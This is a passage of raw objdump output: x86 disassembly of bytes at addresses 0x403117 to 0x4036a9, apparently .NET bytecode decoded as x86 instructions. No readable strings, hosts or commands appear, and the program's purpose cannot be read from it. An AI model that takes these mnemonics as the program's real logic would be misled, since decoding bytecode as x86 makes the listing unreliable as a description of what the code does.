  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 d4       	add    $0xd4720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 dc 21       	and    $0x21dc7216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 46    	or     0x46721825(%edx),%ah
  4031e4:	22 00                	and    (%eax),%al
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 58    	or     0x58721a25(%edx),%ah
  4031f5:	22 00                	and    (%eax),%al
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 6c             	or     0x6c(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 ca             	or     -0x36(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 ca             	or     -0x36(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 ce                	jb     0x403291
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 d8             	or     %esi,-0x28(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 ec                	jb     0x4032d2
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 0c                	jb     0x4032fe
  4032f2:	23 00                	and    (%eax),%eax
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 ca             	or     -0x36(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 22                	jb     0x403330
  40330e:	23 00                	and    (%eax),%eax
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 2a                	jb     0x40334e
  403324:	23 00                	and    (%eax),%eax
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 36                	jb     0x403366
  403330:	23 00                	and    (%eax),%eax
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 46                	jb     0x4034b3
  40346d:	23 00                	and    (%eax),%eax
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 4c             	adc    %esi,0x4c(%edx)
  4034ae:	23 00                	and    (%eax),%eax
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 92 23    	or     0x23927209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	ac                   	lods   %ds:(%esi),%al
  4034ec:	23 00                	and    (%eax),%eax
  4034ee:	70 28                	jo     0x403518
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 d8             	or     %esi,-0x28(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 e4             	or     -0x1c(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	f4                   	hlt
  403521:	23 00                	and    (%eax),%eax
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 d8                	jb     0x403509
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 02             	or     0x2(%edx),%dh
  403540:	24 00                	and    $0x0,%al
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 18             	adc    %esi,0x18(%edx)
  40362e:	24 00                	and    $0x0,%al
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
